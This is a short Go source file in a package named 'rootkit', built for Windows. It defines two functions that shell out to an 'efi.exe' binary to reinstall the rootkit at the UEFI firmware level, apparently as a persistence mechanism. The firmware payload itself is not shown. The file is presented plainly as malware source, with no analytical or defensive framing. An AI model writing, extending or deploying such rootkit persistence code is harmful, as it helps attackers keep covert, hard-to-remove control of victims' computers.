//go:build windows

package rootkit

import (
"os/exec"
)

func UEFISelfReinstall() bool {
cmd := exec.Command("cmd", "/c", "efi.exe self-reinstall")
err := cmd.Run()
if err != nil {
return false
}
return true
}

func UEFIReinstall() bool {
cmd := exec.Command("cmd", "/c", "efi.exe reinstall")
err := cmd.Run()
if err != nil {
return false
}
return true
}
